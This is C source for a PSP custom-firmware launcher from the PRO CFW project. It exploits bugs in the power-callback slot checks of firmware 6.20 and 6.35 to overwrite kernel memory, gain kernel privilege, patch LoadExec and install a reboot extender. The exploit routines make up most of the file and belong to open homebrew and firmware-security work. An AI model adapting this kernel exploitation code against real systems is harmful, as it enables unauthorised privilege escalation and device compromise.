/*
 * This file is part of PRO CFW.

 * PRO CFW is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * PRO CFW is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with PRO CFW. If not, see <http://www.gnu.org/licenses/ .
 */

#include <pspkernel.h>
#include <pspdebug.h>
#include <pspctrl.h>
#include <pspsdk.h>
#include <pspiofilemgr.h>
#include <psputility.h>
#include <psploadexec.h>
#include <psputils.h>
#include <psputilsforkernel.h>
#include <psppower.h>
#include <string.h>
#include <zlib.h>
#include "systemctrl.h"
#include "rebootex.h"
#include "utils.h"
#include "printk.h"

#include "installer.h"
#include "Rebootex_prx.h"
#include "launcher_patch_offset.h"
#include "rebootex_conf.h"

#define INTR(intr) \
	_sw((intr), address); address +=4;
#define INTR_HIGH(intr) \
	_sw((intr&0xFFFF0000) + ((((intr) + (data_address >> 16)) & 0xFFFF)), address); address +=4;
#define INTR_LOW(intr) \
	_sw((intr&0xFFFF0000) + (((intr) + (data_address & 0xFFFF)) & 0xFFFF), address); address +=4;

PSP_MODULE_INFO("PXELauncher", PSP_MODULE_USER, 1, 0);
PSP_MAIN_THREAD_ATTR(PSP_THREAD_ATTR_USER | PSP_THREAD_ATTR_VFPU);
PSP_HEAP_SIZE_KB(128);

//installer path
char installerpath[256];

//psp model
int psp_model = 0;

u32 psp_fw_version = 0;

//load reboot function
int (* LoadReboot)(void * arg1, unsigned int arg2, void * arg3, unsigned int arg4) = NULL;

extern int sceKernelPowerLock(unsigned int, unsigned int);

u8 decompress_buf[1024*1024L];

void do_exploit_639(void);
void do_exploit_660(void);

int scePowerRegisterCallbackPrivate_635(unsigned int slot, int cbid);
int scePowerUnregisterCallbackPrivate_635(unsigned int slot);
int scePowerRegisterCallbackPrivate_620(unsigned int slot, int cbid);
int scePowerUnregisterCallbackPrivate_620(unsigned int slot);
int SysMemUserForUser_D8DE5C1E(int arg1, int arg2, int (* callback)(void), int arg4, int branchkiller);

//register callback function - slot bugged. :D
int scePowerRegisterCallbackPrivate(unsigned int slot, int cbid)
{
	int ret = -1;

	switch(psp_fw_version) {
#ifdef CONFIG_635
		case FW_635:
			ret = scePowerRegisterCallbackPrivate_635(slot, cbid);
			break;
#endif
#ifdef CONFIG_620
		case FW_620:
			ret = scePowerRegisterCallbackPrivate_620(slot, cbid);
			break;
#endif
	}

	return ret;
}

//unregister callback function - its slotcheck is bugged too. ;)
int scePowerUnregisterCallbackPrivate(unsigned int slot)
{
	int ret = -1;

	switch(psp_fw_version) {
#ifdef CONFIG_635
		case FW_635:
			ret = scePowerUnregisterCallbackPrivate_635(slot);
			break;
#endif
#ifdef CONFIG_620
		case FW_620:
			ret = scePowerUnregisterCallbackPrivate_620(slot);
			break;
#endif
	}

	return ret;
}

void build_rebootex_configure(void)
{
	rebootex_config *conf = (rebootex_config *)(REBOOTEX_CONFIG);

	conf->magic = REBOOTEX_CONFIG_MAGIC;
	conf->psp_model = psp_model;
	conf->rebootex_size = size_rebootex;
	conf->psp_fw_version = psp_fw_version;
}

//load reboot wrapper
int _LoadReboot(void * arg1, unsigned int arg2, void * arg3, unsigned int arg4)
{
	//copy reboot extender
	memcpy((char *)REBOOTEX_START, rebootex, size_rebootex);

	//reset reboot flags
	memset((char *)REBOOTEX_CONFIG, 0, 0x100);
	//copy installer path
	memcpy((char *)REBOOTEX_CONFIG_ISO_PATH, installerpath, sizeof(installerpath));

	build_rebootex_configure();

	//forward
	return LoadReboot(arg1, arg2, arg3, arg4);
}

#ifdef CONFIG_620
void recovery_sysmem_620(void)
{
	u32 address;

	address = 0x88000000 + g_offs->patchRangeStart;

	INTR(0xACC24230); /* sw v0, 0x4230(a2) */
	INTR(0x0A003322); /* j 0x0800CC88 */
	INTR(0x00001021); /* addu $v0, $zr, $zr */
	INTR(0x3C058801); /* lui $a1, 0x8801 */
}
#endif

#ifdef CONFIG_635
void recovery_sysmem_635(void)
{
	u32 address, data_address;

	address = 0x88000000 + g_offs->patchRangeStart;
	data_address = 0x88013B40;

	// SysMemForKernel_E82F9E1B:
	INTR_HIGH(0x3C050000);
	INTR_LOW(0x8CA409F8);
	INTR(0x3C038002);
	INTR(0x34620001);
	INTR(0x03E00008);
	INTR(0x0004100A);

	// SysMemForKernel_61BFD5D4:
	INTR_HIGH(0x3C050000);
	INTR_LOW(0x8CA609F8);
	INTR(0x00C41024);
	INTR(0x03E00008);
	INTR(0xACA209F8);

	// SysMemForKernel_458A70B5
	INTR_HIGH(0x3C040000);
	INTR(0x03E00008);
	INTR_LOW(0x8C8209FC);

	// SysMemForKernel_E0A74F2D
	INTR_HIGH(0x3C030000);
	INTR(0x00001021);
	INTR(0x03E00008);
	INTR_LOW(0xAC6404A4);

	// SysMemForKernel_A51E2C33
	INTR_HIGH(0x3C050000);
	INTR_LOW(0x8CA304A4);
	INTR(0x27BDFFF0);
	INTR(0x3C058002);
	INTR(0xAFBF0000);
	INTR(0x10600003);
	INTR(0x34A20001);
	INTR(0x0060F809);
	INTR(0x00000000);
	INTR(0x8FBF0000);
	INTR(0x03E00008);
	INTR(0x27BD0010);

	// SysMemForKernel_25A760F0:
	INTR_HIGH(0x3C050000);
	INTR_LOW(0x8CA604A8);
	INTR(0x3C028002);
	INTR(0x14C00003);
	INTR(0x34430001);
	INTR_LOW(0xACA404A8);
	INTR(0x00001821);
	INTR(0x03E00008);
	INTR(0x00601021);

	// SysMemForKernel_288B090A:
	INTR(0x27BDFFF0);
	INTR(0xAFB00000);
	INTR_HIGH(0x3C100000);
	INTR(0x3C038002);
	INTR_LOW(0x8E0604A8);
	INTR(0xAFBF0004);
	INTR(0x00064027);
	INTR(0x0008102B);
	INTR(0x0006482B);
	INTR(0x01224024);
	INTR(0x15000006);
	INTR(0x34670001);
	INTR(0x8FBF0004);
	INTR(0x8FB00000);
	INTR(0x00E01021);
	INTR(0x03E00008);
	INTR(0x27BD0010);
}
#endif

#ifdef CONFIG_639
void recovery_sysmem_639()
{
	_sw(0x3C058801, SYSMEM_TEXT_ADDR + g_offs->sysmem_patch.sceKernelPowerLockForUser); // lui $a1, 0x8801
}
#endif

//our 6.35 kernel permission call
int kernel_permission_call(void)
{
	struct sceLoadExecPatch *patch;

	//cache invalidation functions
	void (* _sceKernelIcacheInvalidateAll)(void) = (void *)(SYSMEM_TEXT_ADDR + g_offs->sysmem_patch.sceKernelIcacheInvalidateAll);
	void (* _sceKernelDcacheWritebackInvalidateAll)(void) = (void *)(SYSMEM_TEXT_ADDR + g_offs->sysmem_patch.sceKernelDcacheWritebackInvalidateAll);

#ifdef CONFIG_639
	if(psp_fw_version == FW_639) {
		recovery_sysmem_639();
	}
#endif

#ifdef CONFIG_635
	if(psp_fw_version == FW_635) {
		recovery_sysmem_635();
	}
#endif

#ifdef CONFIG_620
	if(psp_fw_version == FW_620) {
		recovery_sysmem_620();
	}
#endif

	//sync cache
	_sceKernelIcacheInvalidateAll();
	_sceKernelDcacheWritebackInvalidateAll();

	//LoadCoreForKernel_EF8A0BEA
	SceModule2 * (* _sceKernelFindModuleByName)(const char * libname) = (void *)g_offs->sceKernelFindModuleByName;

	//find LoadExec module
	SceModule2 * loadexec = _sceKernelFindModuleByName("sceLoadExec");

	//SysMemForKernel_458A70B5
	int (* _sceKernelGetModel)(void) = (void *)(SYSMEM_TEXT_ADDR + g_offs->sysmem_patch.sceKernelGetModel);

	psp_model = _sceKernelGetModel();

	if(psp_model == PSP_GO) {
		patch = &g_offs->loadexec_patch_05g;
	} else {
		patch = &g_offs->loadexec_patch_other;
	}

	//replace LoadReboot function
	_sw(MAKE_CALL(_LoadReboot), loadexec->text_addr + patch->LoadRebootCall);

	//patch Rebootex position to 0x88FC0000
	_sw(0x3C0188FC, loadexec->text_addr + patch->RebootJump); // lui $at, 0x88FC

	//save LoadReboot function
	LoadReboot = (void*)loadexec->text_addr + patch->LoadReboot;

	_sceKernelIcacheInvalidateAll();
	_sceKernelDcacheWritebackInvalidateAll();

	//return success
	return 0xC01DB15D;
}

#if 0
void freezeme(unsigned int color)
{
	while(1)
	{
		unsigned int *p = (unsigned int*) 0x04000000;
		while (p < (unsigned int*) 0x04400000) *p++ = color;
	}
}
#endif

int install_in_cfw(void)
{
	//installer load result
	int result = 0;

	//load installer module
	SceUID mod = sceKernelLoadModule(installerpath, 0, NULL);

	//installer loaded
	if (mod >= 0) {
		//start installer
		result = sceKernelStartModule(mod, strlen(installerpath) + 1, installerpath, NULL, NULL);
	}

	return 0;
}

int write_file(const char *path, unsigned char *buf, int size)
{
	SceUID fd;
	int ret;

	fd = sceIoOpen(path, PSP_O_WRONLY | PSP_O_CREAT | PSP_O_TRUNC, 0777);

	if (fd < 0) {
		goto error;
	}

	ret = sceIoWrite(fd, buf, size);

	if (ret < 0) {
		goto error;
	}

	sceIoClose(fd);

	return 0;
error:
	if (fd >= 0)
		sceIoClose(fd);

	return -1;
}

int gzip_decompress(u8 *dst, const u8 *src, int size)
{
	int ret;
	z_stream strm;

	strm.zalloc = Z_NULL;
	strm.zfree = Z_NULL;
	strm.opaque = Z_NULL;

	ret = inflateInit2(&strm, 15+16);

	if(ret != Z_OK) {
		return -1;
	}

	strm.avail_in = size;
	strm.next_in = (void*)src;
	strm.avail_out = 1024*1024L;
	strm.next_out = decompress_buf;

	ret = inflate(&strm, Z_FINISH);

	if(ret == Z_STREAM_ERROR) {
		inflateEnd(&strm);

		return -3;
	}

	memcpy(dst, decompress_buf, strm.total_out);
	deflateEnd(&strm);

	return strm.total_out;
}

static u8 file_buffer[1024 * 1024L];

void write_files(const char *base)
{
	char fn[256];
	int newsize;

	newsize = gzip_decompress(file_buffer, installer, size_installer);

	if(newsize < 0) {
		pspDebugScreenPrintf("cannot decompress installer %d\n", newsize);

		return;
	}

	strcpy(fn, base);
	strcat(fn, "installer.prx");
	write_file(fn, file_buffer, newsize);

	newsize = gzip_decompress(file_buffer, Rebootex_prx, size_Rebootex_prx);
	
	if(newsize < 0) {
		pspDebugScreenPrintf("cannot decompress rebootex %d\n", newsize);
		
		return;
	}

	strcpy(fn, base);
	strcat(fn, "Rebootex.prx");
	write_file(fn, file_buffer, newsize);
}

#if defined(CONFIG_620) || defined(CONFIG_635)
//safe syscall wrapper for kernel_permission_call - this lets us return safely!
int kernelSyscall(void);
u32 get_power_address(int cbid);

static inline u32 get_power_slot_by_address(u32 address, u32 power_buf_address)
{
	if (address < power_buf_address)
		return (~(power_buf_address - address) + 1) >> 4;

	return (address - power_buf_address) >> 4;
}

#ifdef CONFIG_635
// psp-go don't need this for it's always zero.
static void patch_power_arg(int cbid, u32 power_buf_address)
{
	int slot;

	while (1) {
		slot = 0x204>>4;
		scePowerUnregisterCallbackPrivate(slot);
		scePowerRegisterCallbackPrivate(slot, cbid);

		*(u32*)0x08900008 = 0xDEADBEEF;
		slot = get_power_slot_by_address(0x08900000, power_buf_address);
		scePowerUnregisterCallbackPrivate(slot);
		scePowerRegisterCallbackPrivate(slot, cbid);

		if (*((u32*)0x08900008) == 0) {
			printk("%s: power_arg noped\r\n", __func__);
			break;
		}

		printk("Retrying...\r\n");
		sceKernelDelayThread(1000000);
	}
}

static u16 g_working_intr_prefix[] = {
	0x04A3, // bgezl $a1
	0x04A1, // bgez $a1
	0x04C0, // bltz $a2
	0x04C2, // bltzl $a2
	0x04D0, // bltzal $a2
	0x04D2, // bltzall $a2
	0x04E0, // bltz $a3
	0x04E2, // bltzl $a3
	0x04F0, // bltzal $a3
	0x04F2, // bltzall $a3
	0x0503, // bgezl $t0
	0x0501, // bgez $t0
};

static int is_intr_OK(u32 intr)
{
	u16 prefix;
	int i;

	prefix = intr >> 16;

	for(i=0; i<NELEMS(g_working_intr_prefix); ++i) {
		if (g_working_intr_prefix[i] == prefix)
			return 1;
	}

	return 0; 
}

static int is_pspgo(void)
{
	// This call will always fail, but with a different error code depending on the model
	SceUID result = sceIoOpen("ef0:/", 1, 0777);

	// Check for "No such device" error
	return ((result == (int)0x80020321) ? 0 : 1);
}
#endif

/* for 6.20/6.35 */
void do_exploit(void)
{
	u32 power_buf_address = 0;
	//create empty callback
	int cbid = -1;
	int result;

#ifdef CONFIG_635
	if(psp_fw_version == FW_635) {
		//create a fitting one
		while(!is_intr_OK((u32)cbid)) {
			//sceKernelDeleteCallback(cbid);
			cbid = sceKernelCreateCallback("", NULL, NULL);
		}
	} 
#endif

#ifdef CONFIG_620
	if (psp_fw_version == FW_620) {
		cbid = sceKernelCreateCallback("", NULL, NULL);
	}
#endif

	printk("Got a CBID: 0x%08X\r\n", cbid);

	//Davee $v1 trick, $v1 would leak the power_buf_address when called on an registered slot 0
	scePowerRegisterCallbackPrivate(0, cbid);
	power_buf_address = get_power_address(cbid);
	scePowerUnregisterCallbackPrivate(0);
	printk("power_buf_address 0x%08X\r\n", (uint)power_buf_address);

#ifdef CONFIG_635
	if(psp_fw_version == FW_635 && !is_pspgo()) {
		patch_power_arg(cbid, power_buf_address);
	}
#endif

	//override sysmem function
	unsigned int smpos = g_offs->patchRangeStart; for(; smpos < g_offs->patchRangeEnd; smpos += 16)
	{
		//calculate slot
		unsigned int slot = get_power_slot_by_address(((u32)0x88000000)+smpos, power_buf_address);

		//wipe memory with -1... else overriding fails.
		scePowerUnregisterCallbackPrivate(slot);

		//register dummy callback (override memory ^^)
		result = scePowerRegisterCallbackPrivate(slot, cbid);

		//patching error
		if(result) break;
	}

	//flush changes to memory
	sync_cache();

	//restoring instructions and patching loadexec
	unsigned int interrupts = pspSdkDisableInterrupts();

#ifdef CONFIG_635
	if(psp_fw_version == FW_635) {
		result = SysMemUserForUser_D8DE5C1E(0xC01DB15D, 0xC00DCAFE, kernelSyscall, 0x12345678, -1);
	}
#endif

#ifdef CONFIG_620
	if (psp_fw_version == FW_620) {
		u32 kernel_entry, entry_addr;

		kernel_entry = (u32) &kernel_permission_call;
		entry_addr = ((u32) &kernel_entry) - 16;
		result = sceKernelPowerLock(0, ((u32) &entry_addr) - 0x4234);
	}
#endif

	pspSdkEnableInterrupts(interrupts);
}
#endif

//entry point
int main(int argc, char * argv[])
{
	pspDebugScreenInit();

	psp_fw_version = sceKernelDevkitVersion();

#ifdef CONFIG_660
	if(psp_fw_version == FW_660) {
		goto version_OK;
	}
#endif

#ifdef CONFIG_639
	if(psp_fw_version == FW_639) {
		goto version_OK;
	}
#endif

#ifdef CONFIG_620
	if(psp_fw_version == FW_620) {
		goto version_OK;
	}
#endif

#ifdef CONFIG_635
	if(psp_fw_version == FW_635) {
		goto version_OK;
	}
#endif

	pspDebugScreenPrintf("Sorry. This program doesn't support your FW(0x%08X).\n", (uint)psp_fw_version);
	sceKernelDelayThread(5*1000000);
	goto exit;

version_OK:
	setup_patch_offset_table(psp_fw_version);
	
	//puzzle installer path
	strcpy(installerpath, argv[0]);

	char * slash = strrchr(installerpath, '/');
	if (slash) slash[1] = '\0';
	
	write_files(installerpath);
	strcat(installerpath, "installer.prx");

	printk_init("ms0:/launcher.txt");
	printk("Hello exploit\n");

	if(sctrlHENGetVersion() >= 0) {
		install_in_cfw();

		return 0;
	}

#ifdef CONFIG_660
	if(psp_fw_version == FW_660) {
		do_exploit_660();
	}
#endif

#ifdef CONFIG_639
	if(psp_fw_version == FW_639) {
		do_exploit_639();
	}
#endif

#if defined(CONFIG_620) || defined(CONFIG_635)
	if(psp_fw_version == FW_620 || psp_fw_version == FW_635) {
		do_exploit();
	}
#endif

exit:
	//trigger reboot
	sceKernelExitGame();

	//kill thread
	sceKernelExitDeleteThread(0);

	//return
	return 0;
}

//exit point
int module_stop(SceSize args, void * argp)
{
	//return
	return 0;
}
